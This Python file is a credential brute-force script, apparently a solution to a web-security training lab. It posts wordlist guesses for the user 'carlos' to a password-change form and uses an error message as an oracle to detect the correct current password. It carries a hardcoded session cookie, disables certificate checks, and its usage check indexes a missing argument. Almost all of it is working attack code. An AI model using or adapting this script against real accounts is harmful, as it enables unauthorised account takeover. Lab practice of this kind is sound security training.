import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def brute_force(url):
	with open('/home/kali/Desktop/pythonCodes/password_list.txt') as p:
		passwords = p.readlines()
	for password in passwords:
		print(password.strip("\n"))
		headers = {"Cookie": "session=H6NNaqEGt6sdEbOkSQ9I1fBq2SAaLum3"}
		data = {"username":"carlos", "current-password":password.strip("\n"), "new-password-1":1, "new-password-2":2}
		r = requests.post(url, verify=False, proxies=proxies, data=data,headers=headers, allow_redirects=False)
		res = r.text
		if 'New passwords do not match' in res:
			print("(+) Password is %s" % (password.strip("\n")))
			return
		
	# csrf = soup.body.find_all('input',{"name":"csrf"})[0].get("value")
	
	

def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Brute password")
	brute_force(url)
	
	
	
if __name__ == "__main__":
	main()